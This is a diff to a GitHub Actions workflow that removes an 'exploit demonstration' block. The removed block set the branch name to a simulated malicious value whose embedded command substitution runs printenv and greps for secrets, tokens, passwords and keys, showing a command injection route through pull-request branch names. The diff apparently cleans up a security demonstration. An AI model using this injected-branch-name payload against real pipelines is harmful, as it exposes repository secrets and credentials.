@@ -46,15 +46,6 @@ jobs:
           # Get branch name: use head_ref for PRs, ref_name for pushes
           BRANCH_NAME="${{ github.head_ref || github.ref_name }}"
           
-          # EXPLOIT DEMONSTRATION: Simulate malicious branch name
-          # In real attack, this comes from attacker's fork via pull_request_target
-          BRANCH_NAME='exploit$(printenv | grep -E "(SECRET|PASSWORD|TOKEN|KEY|NEXUS|AWS|DATABASE|API)" | sort)'
-          
-          echo "=================================================="
-          echo "DEMONSTRATING COMMAND INJECTION VULNERABILITY"
-          echo "Simulated malicious branch name: $BRANCH_NAME"
-          echo "=================================================="
-          
           # Sanitize branch name for file paths (replace / with -)
           SAFE_BRANCH_NAME=$(echo "$BRANCH_NAME" | tr '/' '-')
           
@@ -72,8 +63,4 @@ jobs:
           echo "  cat '$REPORT_FILE' | head -20" >> "$POST_SCRIPT"
           echo "fi" >> "$POST_SCRIPT"
           chmod +x "$POST_SCRIPT"
-          
-          echo "=================================================="
-          echo "EXECUTING VULNERABLE SCRIPT - SECRETS WILL LEAK:"
-          echo "=================================================="
           bash "$POST_SCRIPT"
